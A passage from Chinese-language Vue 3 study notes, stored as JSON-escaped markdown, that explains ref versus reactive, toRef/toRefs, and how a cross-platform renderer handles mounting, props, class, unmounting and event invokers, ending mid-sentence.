reactive({foo: 1, bar: 2});\n\n// :::: 使用 ... 运算符\nconst newObj = {...obj}; \n\neffect(() => {\n    console.log(newObj.foo); // newObj 没有任何响应能力，所以这里不会触发 effect\n})\n\n// :::: 很显然，这里不会触发 effect \nobj.foo = 2; \n```\n\n有没有什么办法，即使使用 `newObj` 普通对象访问属性值，也会被收集响应呢？答案如下：\n\n```javascript hl:4,9\nconst obj = reactive({foo: 1, bar: 2});\nconst newObj = {\n    foo: {\n        get value() {\n            return obj.foo\n        }\n    },\n    bar: {\n        get value() {\n            return bar.foo\n        }\n    }\n}\n\neffect(() => {\n    // 这里会触发 get value() ，从而访问了 obj.foo ，从而触发收集依赖\n    console.log(newObj.foo); \n})\n\nobj.foo = 2;\n```\n\n所以封装两个函数 `toRef` 和 `toRefs` \n\n## 4. toRef 与 toRefs\n\n```javascript hl:12,4\nfunction toRefs(obj) {\n  const ret = {}\n  for (const key in obj) {\n    ret[key] = toRef(obj, key)\n  }\n  return ret\n}\n\nfunction toRef(obj, key) {\n  const wrapper = {\n    get value() {\n      return obj[key]\n    },\n    set value(val) {\n      obj[key] = val\n    }\n  }\n\n  Object.defineProperty(wrapper, '__v_isRef', {\n    value: true\n  })\n\n  return wrapper\n}\n```\n\n这样，就能正确的触发收集了。\n\n>  这下知道这个两个函数是干什么的了吧？以前都有一点懵逼\n\n## 5. 自动脱落 `ref` 的能力\n\n最后，我们说说 自动脱落 `ref` 的能力，啥意思呢？\n\n比如模板代码，每次都需要加一个 `.value` ？\n\n```html\n<div>{{foo.value}}</div>\n```\n\n有啥办法解决吗？ 其实很简单，如下代码：\n\n![|808](https://832-1310531898.cos.ap-beijing.myqcloud.com/4a689b99b8f3b3e902890b4f5a93765a.png)\n\n## 6. ref 和 reactive 使用建议\n\n### 6.1. ref 的优势\n\n#### 6.1.1. 原始值包装\n\n```javascript\n// ✅ 使用 ref\nconst count = ref(0)\ncount.value++\n\n// ❌ reactive 不能直接用于原始值\nconst count = reactive(0) // 无效！\n```\n\n#### 6.1.2. 解构安全\n\n```javascript\n// ✅ ref 解构后仍然保持响应性\nconst state = {\n  count: ref(0),\n  name: ref('John')\n}\nconst { count, name } = state\ncount.value++ // 仍然是响应式的\n\n// ❌ reactive 解构会丢失响应性\nconst state = reactive({\n  count: 0,\n  name: 'John'\n})\nconst { count, name } = state // 失去响应性！\n```\n\n#### 6.1.3. 函数返回值更清晰\n\n```typescript\n// ✅ 使用 ref，类型和响应性都很清晰\nfunction useCounter() {\n  const count = ref(0)\n  return { count } // 返回的 count 仍然是响应式的\n}\n\n// ❌ 使用 reactive，返回值可能失去响应性\nfunction useCounter() {\n  const state = reactive({ count: 0 })\n  return { count: state.count } // count 失去响应性！\n}\n```\n\n### 6.2. reactive 的优势\n\n#### 6.2.1. 嵌套对象处理\n\n```javascript\n// ✅ reactive 处理嵌套对象很自然\nconst state = reactive({\n  user: {\n    profile: {\n      name: 'John',\n      age: 30\n    }\n  }\n})\n\n// ❌ ref 处理嵌套对象较繁琐\nconst state = {\n  user: ref({\n    profile: {\n      name: 'John',\n      age: 30\n    }\n  })\n}\n```\n\n#### 6.2.2. 数组操作\n\n```javascript\n// ✅ reactive 数组操作更直观\nconst list = reactive([1, 2, 3])\nlist.push(4)\n\n// ⚠️ ref 需要 .value\nconst list = ref([1, 2, 3])\nlist.value.push(4)\n```\n\n### 6.3. 最佳实践建议\n\n#### 6.3.1. 使用 ref 的场景\n\n```javascript hl:12\n// 1. 原始值\nconst count = ref(0)\nconst name = ref('John')\nconst isActive = ref(true)\n\n// 2. 需要解构的对象\nconst state = {\n  count: ref(0),\n  name: ref('John')\n}\n\n// 3. 组合式函数返回值\nfunction useUser() {\n  const name = ref('John')\n  const age = ref(30)\n  return {\n    name,\n    age\n  }\n}\n```\n\n>  公共 hooks 请尽量使用 `ref` ，多个 `.value` 而已，约定习惯就好了\n\n#### 6.3.2. 使用 reactive 的场景\n\n```javascript\n// 1. 表单数据\nconst formData = reactive({\n  username: '',\n  password: '',\n  remember: false\n})\n\n// 2. 复杂的嵌套数据结构\nconst store = reactive({\n  user: {\n    profile: {\n      // ...深层嵌套数据\n    }\n  },\n  settings: {\n    // ...配置数据\n  }\n})\n\n// 3. 需要保持引用的对象\nconst api = reactive({\n  baseURL: 'https://api.example.com',\n  endpoints: {\n    users: '/users',\n    posts: '/posts'\n  }\n})\n```\n\n#### 6.3.3. 混合使用的最佳实践\n\n```javascript\n// 组合式函数中的混合使用\nfunction useUserProfile() {\n  // 简单值使用 ref\n  const userId = ref(1)\n  const isLoading = ref(false)\n  \n  // 复杂对象使用 reactive\n  const profile = reactive({\n    basic: {\n      name: '',\n      email: ''\n    },\n    preferences: {\n      theme: 'light',\n      notifications: true\n    }\n  })\n  \n  return {\n    userId,\n    isLoading,\n    profile\n  }\n}\n```\n\n### 6.4. 性能考虑\n\n#### 6.4.1. 内存使用\n\n```javascript\n// ref 对简单值的内存开销较小\nconst simpleRef = ref(0)\n\n// reactive 对大对象的代理可能有更多开销\nconst largeObject = reactive({\n  // ... 大量数据\n})\n```\n\n#### 6.4.2. 更新性能\n\n```javascript\n// ref 的更新很直接\nconst count = ref(0)\ncount.value++ // 只触发一次更新\n\n// reactive 的更新可能触发多次\nconst state = reactive({\n  count: 0,\n  total: 0\n})\nstate.count++ // 可能触发多个属性的更新\n```\n\n### 6.5. 总结建议\n\n1. **优先使用 ref**：\n   - 用于简单值\n   - 需要解构的数据\n   - 组合式函数返回值\n   - 需要明确类型的场景\n\n2. **适当使用 reactive**：\n   - 复杂的嵌套对象\n   - 表单数据\n   - 需要保持引用的对象\n   - API 配置等\n\n3. **混合使用原则**：\n```javascript\n// 推荐的混合使用方式\nconst state = {\n  // 简单值用 ref\n  count: ref(0),\n  name: ref(''),\n  \n  // 复杂对象用 reactive\n  formData: reactive({\n    // ...表单字段\n  }),\n  \n  // 数组也推荐用 ref\n  list: ref([])\n}\n```\n\n4. **TypeScript 支持**：\n```typescript\n// ref 类型推导更直接\nconst count = ref<number>(0)\n\n// reactive 需要接口定义\ninterface State {\n  count: number\n  name: string\n}\nconst state = reactive<State>({\n  count: 0,\n  name: ''\n})\n```\n\n> 在大多数简单场景下，使用 ref 确实是更好的选择，但不应该完全排除 reactive 的使用。关键是要理解两者的优缺点，在适当的场景选择合适的方案。\n\n## 7. ref 和 reactive 详细对比\n\n### 7.1. 基本概念\n\n#### 7.1.1. ref\n\n```javascript\n// ref 包装的值需要通过 .value 访问\nconst count = ref(0)\nconsole.log(count.value) // 0\ncount.value++\n\n// ref 会自动解包在模板中使用时\n<template>\n  <div>{{ count }}</div> <!-- 无需 .value -->\n</template>\n```\n\n#### 7.1.2. reactive\n\n```javascript\n// reactive 直接代理对象\nconst state = reactive({\n  count: 0,\n  name: 'John'\n})\nconsole.log(state.count) // 0\nstate.count++\n```\n\n### 7.2. 主要区别\n\n#### 7.2.1. 数据类型支持\n\n```javascript\n// ref - 支持所有类型\nconst num = ref(0)                  // ✅ 数字\nconst str = ref('hello')           // ✅ 字符串\nconst bool = ref(true)             // ✅ 布尔值\nconst arr = ref([1, 2, 3])         // ✅ 数组\nconst obj = ref({ name: 'John' })  // ✅ 对象\n\n// reactive - 只支持对象类型（包括数组）\nconst num = reactive(0)            // ❌ 无效\nconst str = reactive('hello')      // ❌ 无效\nconst obj = reactive({             // ✅ 有效\n  count: 0,\n  name: 'John'\n})\nconst arr = reactive([1, 2, 3])    // ✅ 有效\n```\n\n#### 7.2.2. 解构行为\n\n```javascript\n// ref - 保持响应性\nconst state = {\n  count: ref(0),\n  name: ref('John')\n}\nconst { count, name } = state\ncount.value++ // ✅ 仍然是响应式的\n\n// reactive - 失去响应性\nconst state = reactive({\n  count: 0,\n  name: 'John'\n})\nconst { count, name } = state // ❌ 解构后失去响应性\n\n// reactive 解构保持响应性的方法\nimport { toRefs } from 'vue'\nconst state = reactive({\n  count: 0,\n  name: 'John'\n})\nconst { count, name } = toRefs(state) // ✅ 转换为 ref 后解构\n```\n\n#### 7.2.3. 嵌套数据处理\n\n```javascript hl:11\n// ref - 嵌套对象需要额外的 .value\nconst user = ref({\n  profile: {\n    name: 'John',\n    age: 30\n  }\n})\nconsole.log(user.value.profile.name)\nuser.value.profile.age++\n\n// reactive - 自动递归代理\nconst user = reactive({\n  profile: {\n    name: 'John',\n    age: 30\n  }\n})\nconsole.log(user.profile.name)\nuser.profile.age++\n```\n\n### 7.3. 使用场景对比\n\n#### 7.3.1. 适合使用 ref 的场景\n\n##### 7.3.1.1. 简单值管理\n\n```javascript\n// 计数器\nconst count = ref(0)\nconst increment = () => count.value++\n\n// 开关状态\nconst isVisible = ref(false)\nconst toggle = () => isVisible.value = !isVisible.value\n```\n\n##### 7.3.1.2. **组合式函数返回值**\n\n```javascript\nfunction useCounter() {\n  const count = ref(0)\n  const increment = () => count.value++\n  return {\n    count,    // 返回 ref，保持响应性\n    increment\n  }\n}\n```\n\n##### 7.3.1.3. 需要解构的数据 → 保证安全解构\n\n```javascript\nfunction useUserInfo() {\n  const name = ref('John')\n  const age = ref(30)\n  \n  return {\n    name,\n    age\n  }\n}\n\n// 使用时可以安全解构\nconst { name, age } = useUserInfo()\n```\n\n#### 7.3.2. 适合使用 reactive 的场景\n\n##### 7.3.2.1. 表单数据\n\n```javascript\nconst formData = reactive({\n  username: '',\n  password: '',\n  confirmPassword: '',\n  email: '',\n  agreeToTerms: false\n})\n\n// 表单验证\nconst errors = reactive({\n  username: [],\n  password: [],\n  email: []\n})\n```\n\n##### 7.3.2.2. 复杂状态管理\n\n```javascript\nconst store = reactive({\n  user: {\n    id: null,\n    name: '',\n    permissions: []\n  },\n  settings: {\n    theme: 'light',\n    notifications: true\n  },\n  cache: new Map()\n})\n```\n\n##### 7.3.2.3. API 配置对象\n\n```javascript\nconst api = reactive({\n  baseURL: 'https://api.example.com',\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': null\n  },\n  timeout: 5000\n})\n```\n\n### 7.4. 性能考虑\n\n#### 7.4.1. 内存占用\n\n```javascript\n// ref - 每个值都是独立的响应式对象\nconst state = {\n  name: ref('John'),\n  age: ref(30),\n  city: ref('New York')\n}\n\n// reactive - 一个代理对象管理多个值\nconst state = reactive({\n  name: 'John',\n  age: 30,\n  city: 'New York'\n})\n```\n\n#### 7.4.2. 更新性能\n\n```javascript\n// ref - 精确的更新\nconst count = ref(0)\ncount.value++ // 只触发一个属性的更新\n\n// reactive - 可能触发多个更新\nconst state = reactive({\n  count: 0,\n  total: 0\n})\nstate.count++ // 可能触发相关属性的连锁更新\n```\n\n### 7.5. TypeScript 支持\n\n#### 7.5.1. ref 类型定义\n\n```typescript\n// 简单类型\nconst count = ref<number>(0)\nconst name = ref<string>('John')\n\n// 复杂类型\ninterface User {\n  name: string\n  age: number\n}\nconst user = ref<User>({\n  name: 'John',\n  age: 30\n})\n```\n\n#### 7.5.2. reactive 类型定义\n\n```typescript\n// 接口定义\ninterface State {\n  count: number\n  name: string\n  users: User[]\n}\n\nconst state = reactive<State>({\n  count: 0,\n  name: '',\n  users: []\n})\n```\n\n### 7.6. 最佳实践建议\n\n#### 7.6.1. 混合使用策略\n\n```javascript\nfunction useUserSystem() {\n  // 简单值使用 ref\n  const isLoggedIn = ref(false)\n  const currentUserId = ref(null)\n  \n  // 复杂对象使用 reactive\n  const userState = reactive({\n    profile: {\n      name: '',\n      email: '',\n      preferences: {}\n    },\n    permissions: new Set(),\n    metadata: new Map()\n  })\n  \n  return {\n    isLoggedIn,\n    currentUserId,\n    userState\n  }\n}\n```\n\n#### 7.6.2. 代码组织建议\n\n```javascript\n// 按职责分离 ref 和 reactive\nconst ui = {\n  isLoading: ref(false),\n  error: ref(null),\n  currentTab: ref('home')\n}\n\nconst data = reactive({\n  users: [],\n  posts: [],\n  comments: []\n})\n\nconst cache = reactive(new Map())\n```\n\n总的来说，ref 和 reactive 各有优势，选择使用哪个主要取决于：\n1. 数据类型（原始值vs对象）\n2. 是否需要解构\n3. 数据的复杂度\n4. 性能考虑\n5. 代码组织方式\n\n## 8. 个人建议\n\n> 建议还是都使用 ref 吧，省得理解成本高，你不能保证团队所有人都理解他们的区别\n> 麻烦的点在于每次都 `.value` ，习惯了就还好！","yfbT1DXt":"\n# Vue3 渲染器的原理和实现\n\n\n`#vue` `#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 渲染器的作用是将 `虚拟 DOM对象` 渲染为 `真实DOM元素`\n\t- 其核心在于更新时的 Diff 算法\n- 如何实现一个==跨平台渲染器==，即不依赖于`具体宿主`\n\t- 如 浏览器的 `DOM API`\n\t- 或 Node.js 端\n\t- 或 客户端 等\n\t- 或 ==小程序== 等\n\t- 实现跨平台渲染器的关键是 **将渲染操作抽象为可配置的对象**\n\t\t- `const renderer = createRenderer(创建元素方法、插入元素方法、设置文本方法等)`\n- 属性处理：\n\t- 需要区分 HTML Attributes 和 DOM Properties\n\t- 并正确处理特殊属性如 class 和 style。\n- 事件处理采用**特殊的设计**来优化性能并解决事件冒泡和更新时机的问题\n\t- `on` 开头的属性才需要处理\n\t\t- `invokers：事件处理函数` 用于处理事件回调函数\n\t\t\t- `invokers[key]` \n\t\t\t\t- `key` 代表 `事件名称` \n\t\t\t- `真正的事件 callback` 存在 `invokers.value` 中\n\t- ==规避性能问题==：比如更新事件时，直接更新 `invokers.value` 即可\n\t\t- 没必要每次都调用 `removeEventListener` 来移除上一次绑定的事件\n- ==子节点更新==涉及多种情况，需要正确处理新旧节点的变化\n\t- 一共==六种情况==\n\t\t- 6种情况：`【新节点、老节点】 * 【文本节点、一组节点、null】`\n- 特殊节点如文本节点、注释节点和 Fragment 需要特殊处理\n\t- 使用 `symbol` \n- Vue3 的渲染器设计考虑了性能优化、跨平台兼容性和特殊场景的处理\n- 渲染器的实现涉及多个方面，包括挂载、更新、卸载等操作的细节处理\n\t- 比如==卸载时==，需要执行相应的钩子函数\n- Fragment 的存在简化了组件的结构\n\t- 类似于 React 的空标签 或 Fragment 组件\n\t- 在挂载、更新、卸载操作是，**不处理它本身**，==只处理它的子节点==即可\n\n## 2. 何为渲染器？\n\n以`浏览器平台`来说，如下的`rendere r函数`就是一个`渲染器` 。\n\n```js\nfunction renderer(domString, container) {\n  container.innerHTML = domString\n}\n\nrenderer(`<h1>hello app</h1>`, document.getElementById('app'));\n```\n\n- 渲染器的作用是，把**虚拟DOM 对象渲染为真实 DOM元素**\n- 它的**工作原理**是\n\t- **递归地遍历虛拟DOM对象，并调用原生 DOM API 来完成真实 DOM 的创建**\n- 渲染器的**精髓**在于后续的更新\n\t- 它会通过 ==Diff 算法== 找出变更点，并且只会更新需要更新的内容\n\n## 3. 渲染器与响应式系统\n\n即结合 `响应式能力`，实现 `自动`调用渲染器完成渲染和更新\n- 即变量变了，UI 主动更新\n\n如下代码，使用 `effect`, `ref` 两个变量。\n\n```vue hl:8,18,23\n\n<div id=\"app\"></div>\n\n<script src=\"https://unpkg.com/@vue/reactivity@3.0.5/dist/reactivity.global.js\"></script>\n\n<script>\n\n// ::::暴露的全局 API\nconst { effect, ref } = VueReactivity; \n\nfunction renderer(domString, container) {\n  container.innerHTML = domString\n}\n\nconst count = ref(1)\n\neffect(() => {\n  renderer(`<h1>${count.value}</h1>`, document.getElementById('app'))\n})\n\ncount.value++\n\n// 2s后更新\nsetTimeout(() => {\n    count.value++;\n},2000)\n\n</script>\n```\n\n## 4. 渲染的一些基本概念\n\n- `渲染器`与`渲染`\n\t- 名词 和 动词 的区别\n- `挂载`\n\t- 即 `mount` ，将 `虚拟 DOM` 渲染成 `真实 DOM 节点`\n- `容器`\n\t- 即渲染`到哪儿`？\n\n下面来看一个如何实现一个**渲染器函数**\n\n- `createRender`\n\n```vue hl:42\n<div id=\"app\"></div>\n\n<script src=\"https://unpkg.com/@vue/reactivity@3.0.5/dist/reactivity.global.js\"></script>\n\n<script>\n    function createRenderer() {\n        /**\n         * @desc 补丁函数\n         * @param {VNode} oldNode 旧的 VNode\n         * @param {VNode} newNode 新的 VNode\n         * @param {HTMLElement} container 容器\n         * */\n        function patch(oldNode, newNode, container) {\n        \n        }\n        function render(vnode, container) {\n\t        // 新 vnode 存在，将其与旧 vnode 一起传递给 patch 函数进行打补丁\n            if (vnode) {\n                patch(container._vnode, vnode, container);\n            } else {\n                if (container._vnode) { // 卸载操作\n                    // 旧 vnode 存在，且新 vnode 不存在，说明是 卸载(unmount)操作\n                    // 只需要将 container 内的 DOM 清空即可\n                    container.innerHTML = ''\n                }\n            }\n            // 把 vnode 存储到 container._vnode 下，即后续渲染中的旧 vnode\n            container._vnode = vnode\n        }\n        // 服务端渲染时会用到\n        function hydrate() {\n        \n        }\n        return {\n            render,\n            hydrate\n        }\n    }\n    \n    const renderer = createRenderer()\n    // 三次渲染，都渲染到#app上 \n    // 首次渲染\n    renderer.render(vnode1, document.querySelector('#app'))\n    // 第二次渲染\n    renderer.render(vnode2, document.querySelector('#app'))\n    // 第三次渲染\n    renderer.render(null, document.querySelector('#app'))\n    \n</script>\n```\n\n## 5. 实现一个极简跨平台渲染器\n\n- 如何实现一个渲染器，即不依赖于`具体宿主`\n\t- 如 浏览器的 `DOM API`\n\t- 或 Node.js 端\n\t- 或 客户端 等\n\t- 或 ==小程序== 等\n\n```js hl:26,27\nfunction createRenderer(options) {\n    // ::::为了实现跨平台，将渲染器的操作抽象为 options 对象::::\n    // 如：创建元素 createElement，\n    // 如：设置元素文本 setElementText\n    // 如：插入元素 insert\n    const {\n        createElement,\n        insert,\n        setElementText\n    } = options;\n    \n    function mountElement(vnode, container) {\n        \n        // 这里的 createElement 依赖于具体宿主\n        const el = createElement(vnode.type)\n        \n        // 说明是文本内容，调用 setElementText 插入\n        if (typeof vnode.children === 'string') {\n            setElementText(el, vnode.children)\n        }\n        \n        insert(el, container)\n    }\n    \n    function patch(n1, n2, container) {\n        // 真正的挂载操作\n        if (!n1) {\n            mountElement(n2, container)\n        } else {\n            // n1 存在，这里需要打补丁\n        }\n    }\n    \n    function render(vnode, container) {\n        if (vnode) {\n            // 新 vnode 存在，将其与旧 vnode 一起传递给 patch 函数进行打补丁\n            patch(container._vnode, vnode, container)\n        } else {\n            if (container._vnode) {\n                // 旧 vnode 存在，且新 vnode 不存在，说明是卸载(unmount)操作\n                // 只需要将 container 内的 DOM 清空即可\n                container.innerHTML = ''\n            }\n        }\n        // 把 vnode 存储到 container._vnode 下，即后续渲染中的旧 vnode\n        container._vnode = vnode\n    }\n    \n    return {\n        render\n    }\n}\n```\n\n上面代码把`创建、修改、及删除操作`等抽象成可配置的对象\n\n### 5.1. 浏览器端\n\n比如在浏览器环境下，调用`浏览器`特定的 `DOM API` ，如下代码：\n\n```js\nconst renderer = createRenderer({\n  createElement(tag) {\n    return document.createElement(tag)\n  },\n  setElementText(el, text) {\n    el.textContent = text\n  },\n  insert(el, parent, anchor = null) {\n    parent.insertBefore(el, anchor)\n  }\n})\n\nconst vnode = {\n    type: 'h1',\n    children: 'hello'\n}\n\nrenderer.render(vnode, document.querySelector('#app'))\n\n```\n\n### 5.2. Nodejs 端\n\n而在 `Nodejs 环境`下，如下代码：\n\n```js\n\nconst renderer2 = createRenderer({\n    createElement(tag) {\n        console.log(`创建元素 ${tag}`)\n        return {tag}\n    },\n    setElementText(el, text) {\n        console.log(`设置 ${JSON.stringify(el)} 的文本内容：${text}`)\n        el.text = text\n    },\n    insert(el, parent, anchor = null) {\n        console.log(`将${JSON.stringify(el)}添加到${JSON.stringify(parent)} 下`)\n        parent.children = el\n    }\n});\n\nconst container = {type: 'root'};\nrenderer2.render(vnode, container);\n```\n\n## 6. 如何挂载 `子节点` 及 `子节点的属性`\n\n### 6.1. 首先看如何挂载子节点\n\n以下是是一个能够跑起来的 `最简易的 DEMO` :\n\n```js hl:23,16,25,15\n<div id=\"app\"></div>\n\n<script src=\"https://unpkg.com/@vue/reactivity@3.0.5/dist/reactivity.global.js\"></script>\n\n<script>\n    function createRenderer(options) {\n        const {\n            createElement,\n            insert,\n            setElementText\n        } = options\n        function mountElement(vnode, container) {\n            const el = createElement(vnode.type)\n            if (typeof vnode.children === 'string') {\n                setElementText(el, vnode.children)\n                // 递归渲染子节点即可\n            } else if (Array.isArray(vnode.children)) {\n                vnode.children.forEach(child => {\n                    patch(null, child, el)\n                })\n            }\n            // 设置属性\n            if (vnode.props) {\n                for (const key in vnode.props) {\n                    el.setAttribute(key, vnode.props[key])\n                }\n            }\n            // 插入到容器中\n            insert(el, container)\n        }\n        function patch(n1, n2, container) {\n            if (!n1) {\n                mountElement(n2, container)\n            } else {\n                // // ::::补丁逻辑\n            }\n        }\n\n        function render(vnode, container) {\n            if (vnode) {\n                // 新 vnode 存在，将其与旧 vnode 一起传递给 patch 函数进行打补丁\n                patch(container._vnode, vnode, container)\n            } else {\n                if (container._vnode) {\n                    // 旧 vnode 存在，且新 vnode 不存在，说明是卸载(unmount)操作\n                    // 只需要将 container 内的 DOM 清空即可\n                    container.innerHTML = ''\n                }\n            }\n            // 把 vnode 存储到 container._vnode 下，即后续渲染中的旧 vnode\n            container._vnode = vnode\n        }\n\n        return {\n            render\n        }\n    }\n    const renderer = createRenderer({\n        createElement(tag) {\n            return document.createElement(tag)\n        },\n        setElementText(el, text) {\n            el.textContent = text\n        },\n        insert(el, parent, anchor = null) {\n            parent.insertBefore(el, anchor)\n        }\n    })\n    const vnode = {\n        type: 'div',\n        props: {\n            id: 'foo'\n        },\n        children: [\n            {\n                type: 'p',\n                children: 'p tag'\n            },\n            {\n                type: 'h1',\n                children: 'H1 tag'\n            },\n            {\n                type: 'div',\n                children: [\n                    {\n                        type: 'span',\n                        children: 'div > span > tag'\n                    }\n                ]\n            }\n        ]\n    }\n    renderer.render(vnode, document.querySelector('#app'))\n\n</script>\n```\n\n下图是最终`渲染的效果`：\n\n![](https://od-1310531898.cos.ap-beijing.myqcloud.com/202305232003540.png)\n\n两个注意点：\n\n- 递归逻辑：如果存在 `children` 则接着遍历\n- 设置属性使用 `el.setAttribute(key,value)` \n\t- 我们也可以使用 `el[key] = value` 的方式\n\t- 但是，**为元素设置属性比想象中的更复杂得多**\n\n下面先区分 `HTML Attributes` 和 `DOM Properities`\n\n### 6.2. `HTML Attributes` 和 `DOM Properities` 不一样\n\n浏览器解析完以下 `HTML代码段` 后，会创建以之相符的 `DOM 元素对象` ，比如\n- `id=\"app\"` 对应 `el.id`\n- `class=\"green\"` 对应 `el.className` ，说明两者并不是一一对应的。\n\n```html\n<div id=\"app\" class=\"green\"></div>\n\n<div data-a=\"3\" mmm=\"asdf\" draggable=\"true\"></div>\n\n<form id=\"aaa\"></form>\n```\n\n又比如下面的 HTML 片段，把 `foo` 改成 `bar`\n\n```html\n<!-- 如果 foo 改成 bar -->\n<input value=\"foo\" form=\"aaa\"/>\n```\n\n- `el.getAttribute('value')` 和 `el.defaultValue` 始终是 `foo`\n- 只有 `el.value` 为修改的值\n\n又比如修改上面 input 的 type 值： `el.type = 'xxx'` ，浏览器会==矫正==这个不合法的 `xxx` 为 `text`\n\n> [!abstract]\n> \n**综上：** `HTML Attributes` **是为** `DOM Properities`**设置**`初始值`**的**\n\n### 6.3. 如何正常的设置属性\n\n比如如下 `vnode` \n- `disabled` 需要处理成 布尔值\n\n```js\nconst vnode = {\n  type: 'button',\n  props: {\n    disabled: '' // 需要处理成 false \n  },\n  children: 'Button'\n}\n```\n\n```js\n// form 是只读的，只能通过 setAttribute 来设置\nfunction shouldSetAsProps(el, key, value) {\n  if (key === 'form' && el.tagName === 'INPUT') return false\n  return key in el\n}\n\n// 省略了很多逻辑\nif (vnode.props) {\n  for (const key in vnode.props) {\n\tpatchProps(el, key, null, vnode.props[key])\n  }\n}\n\n// 下面是传入的 patchProp 的场景\npatchProps(el, key, preValue, nextValue) {\n    if (shouldSetAsProps(el, key, nextValue)) {\n      const type = typeof el[key];\n      // 兼容 el.disabled = false 这种情况, 以及 el.disabled = '' 这种情况\n      if (type === 'boolean' && nextValue === '') {\n        el[key] = true\n      } else {\n        el[key] = nextValue\n      }\n    } else {\n      el.setAttribute(key, nextValue)\n    }\n  }\n```\n\n上面代码展示了如何正确设置属性，即根据不同的标签类型，使用不同的设置属性的方法，另外需要关注下更新前后的值，如 `preValue, nextValue`\n\n> 上面代码只展示了关键逻辑部分\n\n## 7. `class属性` 与 `style 属性` 的处理\n\n如下节点，我们希望挂载子节点的 class 属性，并且做增强\n\n```js\nconst vnode = {\n  type: 'p',\n  props: {\n    class: 'foo bar baz',\n    class: {'foo': true},\n    class: ['foo bar baz','abc'],\n  },\n  children: 'text'\n}\n```\n\n主要逻辑如下：\n\n```js\n  patchProps(el, key, preValue, nextValue) {\n    //************** here 这里  ************//\n    if (key === 'class') {\n      el.className = nextValue\n    } else if (shouldSetAsProps(el, key, nextValue)) {\n      const type = typeof el[key]\n      if (type === 'boolean' && nextValue === '') {\n        el[key] = true\n      } else {\n        el[key] = nextValue\n      }\n    } else {\n      el.setAttribute(key, nextValue)\n    }\n  }\n```\n\n- 这里为什么要使用 `className` ，\n\t- 而不是 `el.classList` 和`setAttribute('class','xxxx')` \n\t\t- 因为`性能更优` \n\n另外，vue 也对 `style` 属性做了些增强，支持 `对象和字符串` \n\n## 8. 如何卸载一个节点\n\n前面，我们自己通过 `InnerHTML` 的方式来卸载，有以下问题\n\n1. 这个组件可能由多个组件组成，`没办法细粒度的控制每个组件的卸载`，即不能正确调用 `钩子生命周期函数`，如 `beforeUnmount` 或者 `unmounted` 等\n2. 有些元素存在`指令`，卸载时，应该正确执行对应的 `指令钩子函数`\n3. 没法正确移除 DOM 上绑定的`事件`\n\n所以，我们需要通过以下方式来实现：\n\n```js hl:6\nfunction unmount(vnode) {\n    const parent = vnode.el.parentNode\n    if (parent) {\n        parent.removeChild(vnode.el)\n    }\n    // 在这里，我们可以调用该节点树下的指令钩子函数 和 生命周期函数\n}\n\nfunction render(vnode, container) {\n    if (vnode) {\n        patch(container._vnode, vnode, container)\n    } else {\n        if (container._vnode) {\n            // 旧 vnode 存在，且新 vnode 不存在，说明是卸载(unmount)操作\n            unmount(container._vnode)\n        }\n    }\n    // 把 vnode 存储到 container._vnode 下，即 后续渲染中的旧 vnode\n    container._vnode = vnode\n}\n```\n\n单独提出 `unmount` ，好处是：我们可以调用该节点树下的指令钩子函数 和 生命周期函数\n\n>[!info]  \n其实，卸载时，真正还有很多事情要搞，比如遍历 `虚拟 DOM树节点`，`递归卸载`子元素等等，这里只是给了一个简单的说明\n\n## 9. 为什么要区分 vnode 的 类型 ?\n\n看下面一个例子：\n\n```js\nconst vnode = {\n    type: 'p',\n    props: {\n        class: 'foo bar baz'\n    },\n    children: 'text'\n}\nrenderer.render(vnode, document.querySelector('#app'))\n\nconst newVnode = {\n    type: 'div',\n    props: {\n        id: 'foo'\n    },\n    children: 'hello'\n}\n\nsetTimeout(() => {\n    renderer.render(newVnode, document.querySelector('#app'))\n}, 1000);\n```\n\n我们发现 `vnode` 的 `type` 值都发生变化了，由 `p` 变成 `div` ，这个时候，还需要`打补丁`吗？\n- 是的\n\t- ① 应该先把 `p 挂载` \n\t- ② 然后再将 `div 挂载`\n- 如下代码：\n\n```js hl:2,7,15 \nfunction patch(n1, n2, container) {\n    // 类型不同，直接卸载\n    if (n1 && n1.type !== n2.type) {\n        unmount(n1);\n        n1 = null\n    }\n    // 挂载新的 vnode \n    const {type} = n2\n    if (typeof type === 'string') {\n        if (!n1) {\n            mountElement(n2, container)\n        } else {\n            patchElement(n1, n2)\n        }\n    // 如果是 Object ，需要再特殊处理,递归处理\t\n    } else if (typeof type === 'object') {\n        // 组件\n    }\n}\n```\n\n- 如果是 `Object` ， 需要调用 `mountComponent` 和 `patchComponent` 来继续`递归处理`，直到遇到`普通的标签元素`，如 `div`\n\n下面是`对具体元素打补丁`的逻辑：\n\n```js\nfunction patchElement(n1, n2) {\n    const el = n2.el = n1.el\n    const oldProps = n1.props\n    const newProps = n2.props;\n    \n    // 对【新添加的元素属性】打补丁\n    for (const key in newProps) {\n        if (newProps[key] !== oldProps[key]) {\n            patchProps(el, key, oldProps[key], newProps[key])\n        }\n    }\n    // 对 【旧的的元素属性】 打补丁\n    for (const key in oldProps) {\n        if (!(key in newProps)) {\n            patchProps(el, key, oldProps[key], null)\n        }\n    }\n}\n```\n\n## 10. 事件的处理\n\n> 事件只是 DOM 上的一个属性，所以当做特殊的 `props` 来处理\n\n如何给 `vnode` 绑定事件呢？比如如 `虚拟节点`\n\n```js hl:5,8\nconst vnode = {\n    type: 'p',\n    props: {\n        onClick: [\n            () => {\n                alert('clicked 1')\n            },\n            () => {\n                alert('clicked 2')\n            }\n        ]\n    },\n    children: 'text'\n}\n```\n\n我们直接来看代码实现，后面再说明为什么这么设计？\n\n```js hl:2\npatchProps(el, key, prevValue, nextValue) {\n    if (/^on/.test(key)) {\n        const invokers = el._vei || (el._vei = {})\n        let invoker = invokers[key]\n        const name = key.slice(2).toLowerCase()\n        if (nextValue) {\n            if (!invoker) {\n                invoker = el._vei[key] = (e) => {\n                    if (Array.isArray(invoker.value)) {\n                        invoker.value.forEach(fn => fn(e))\n                    } else {\n                        invoker.value(e)\n                    }\n                }\n                invoker.value = nextValue\n                el.addEventListener(name, invoker)\n            } else {\n                invoker.value = nextValue\n            }\n        } else if (invoker) {\n            el.removeEventListener(name, invoker)\n        }\n    } else if (key === 'class') {\n        \n    } else if (shouldSetAsProps(el, key, nextValue)) {\n        \n    } else {\n        \n    }\n}\n})\n```\n\n说明：\n\n- `on` 开头的属性才需要处理\n\t- `invokers：事件处理函数` 用于处理事件回调函数\n\t- `真正的事件 callback` 存在 `invokers.value` 中\n- 问：为什么要这样\n\t- 解决性能问题\n\t\t- 